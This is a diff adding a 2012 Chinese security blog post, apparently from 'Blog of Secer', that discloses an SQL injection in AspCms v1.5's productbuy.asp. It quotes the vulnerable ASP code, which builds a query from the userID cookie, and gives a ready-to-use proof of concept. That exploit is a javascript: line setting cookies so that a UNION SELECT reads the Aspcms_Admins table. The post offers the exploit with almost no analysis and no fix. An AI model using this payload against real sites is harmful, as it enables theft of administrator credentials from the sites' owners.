@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>AspCms_v1.5_20110517 SQL注射 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-12-24T16:34:25.000Z" itemprop="datePublished">
+          2012-12-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/注入漏洞/'>注入漏洞</a>
+    
+    
+</span>
+    <h1 class="post-title">AspCms_v1.5_20110517 SQL注射</h1>
+    <section class="post-content">
+      <p>my5t3ry@t00ls </p>  <p>前些天路过某个小站，用的AspCms这个系统，搜索了下，productbuy.asp这个文件存在注射，但是目标已经修补….下载了代码，很奇葩的是productbuy.asp这个文件官方虽然修补了网上提到的<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，但是就在同一个文件下面找到了<a href="http://ha.cker.in/tag/注入漏洞" target="_blank">注入漏洞</a>。。。。。。。    <br>废话不多说，看代码：</p>  <pre>&lt;%<br><span style="color: #0000ff">if</span> action = &quot;<span style="color: #8b0000">buy</span>&quot; <span style="color: #0000ff">then</span><br>    addOrder()<br><span style="color: #0000ff">else</span><br>    echoContent()<br><span style="color: #0000ff">end</span> <span style="color: #0000ff">if</span><br><br>……略过<br><br><span style="color: #0000ff">Sub</span> echoContent()<br>    <span style="color: #0000ff">dim</span> id<br>    id=getForm(&quot;<span style="color: #8b0000">id</span>&quot;,&quot;<span style="color: #8b0000">get</span>&quot;)<br><br>    <span style="color: #0000ff">if</span> isnul(id) <span style="color: #0000ff">or</span> <span style="color: #0000ff">not</span> isnum(id) <span style="color: #0000ff">then</span> alertMsgAndGo &quot;<span style="color: #8b0000">请选择产品！</span>&quot;,&quot;<span style="color: #8b0000">-1</span>&quot;<br><br>    <span style="color: #0000ff">dim</span> templateobj,channelTemplatePath : <span style="color: #0000ff">set</span> templateobj = mainClassobj.createObject(&quot;<span style="color: #8b0000">MainClass.template</span>&quot;)<br>    <span style="color: #0000ff">dim</span> typeIds,rsObj,rsObjtid,Tid,rsObjSmalltype,rsObjBigtype,selectproduct<br>    <span style="color: #0000ff">Dim</span> templatePath,tempStr<br>    templatePath = &quot;<span style="color: #8b0000">/</span>&quot;&amp;sitePath&amp;&quot;<span style="color: #8b0000">templates/</span>&quot;&amp;defaultTemplate&amp;&quot;<span style="color: #8b0000">/</span>&quot;&amp;htmlFilePath&amp;&quot;<span style="color: #8b0000">/productbuy.html</span>&quot;<br><br>    <span style="color: #0000ff">set</span> rsObj=conn.Exec(&quot;<span style="color: #8b0000">select title from aspcms_news where newsID=</span>&quot;&amp;id,&quot;<span style="color: #8b0000">r1</span>&quot;)<br>    selectproduct=rsObj(0)<br><br>    <span style="color: #0000ff">Dim</span> linkman,gender,phone,mobile,email,qq,address,postcode<br>    <span style="color: #0000ff">if</span> isnul(rCookie(&quot;<span style="color: #8b0000">loginstatus</span>&quot;)) thenwCookie&quot;<span style="color: #8b0000">loginstatus</span>&quot;,0<br>    <span style="color: #0000ff">if</span> rCookie(&quot;<span style="color: #8b0000">loginstatus</span>&quot;)=1 <span style="color: #0000ff">then</span><br>        <span style="color: #0000ff">set</span> rsObj=conn.Exec(&quot;<span style="color: #8b0000">select *from aspcms_Users where UserID=</span>&quot;&amp;trim(rCookie(&quot;<span style="color: #8b0000">userID</span>&quot;)),&quot;<span style="color: #8b0000">r1</span>&quot;)<br>        linkman=rsObj(&quot;<span style="color: #8b0000">truename</span>&quot;)<br>        gender=rsObj(&quot;<span style="color: #8b0000">gender</span>&quot;)<br>        phone=rsObj(&quot;<span style="color: #8b0000">phone</span>&quot;)<br>        mobile=rsObj(&quot;<span style="color: #8b0000">mobile</span>&quot;)<br>        email=rsObj(&quot;<span style="color: #8b0000">email</span>&quot;)<br>        qq=rsObj(&quot;<span style="color: #8b0000">qq</span>&quot;)<br>        address=rsObj(&quot;<span style="color: #8b0000">address</span>&quot;)<br>        postcode=rsObj(&quot;<span style="color: #8b0000">postcode</span>&quot;)<br>    <span style="color: #0000ff">else</span><br>        gender=1<br>    <span style="color: #0000ff">end</span> <span style="color: #0000ff">if</span><br>    rsObj.close()<br><br>    <span style="color: #0000ff">with</span> templateObj<br>        .content=loadFile(templatePath)<br>        .parseHtml()<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">{aspcms:selectproduct}</span>&quot;,selectproduct)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:linkman]</span>&quot;,linkman)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:gender]</span>&quot;,gender)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:phone]</span>&quot;,phone)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:mobile]</span>&quot;,mobile)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:email]</span>&quot;,email)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:qq]</span>&quot;,qq)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:address]</span>&quot;,address)<br>        .content=replaceStr(.content,&quot;<span style="color: #8b0000">[aspcms:postcode]</span>&quot;,postcode)<br>        .parseCommon()<br>        echo .content<br>    <span style="color: #0000ff">end</span> <span style="color: #0000ff">with</span><br>    <span style="color: #0000ff">set</span> templateobj =<span style="color: #0000ff">nothing</span> : terminateAllObjects<br><span style="color: #0000ff">End</span> <span style="color: #0000ff">Sub</span></pre><br><br><p>漏洞很明显，没啥好说的<br>  <br>poc：</p>
+
+<blockquote><br>  <p>javascript:alert(document.cookie=&quot;loginstatus=&quot; + escape(&quot;1&quot;));alert(document.cookie=&quot;userID=&quot; + escape(&quot;1 union select 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2 from [Aspcms_Admins]&quot;));</p></blockquote>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/960.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/960.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/960.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/960.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/961.seo/">
+        ← Raspberry Pi下跑aircrack和reaver破解路由器PIN码
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/959.seo/">
+        利用重复参数数组变量构造php免杀木马 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
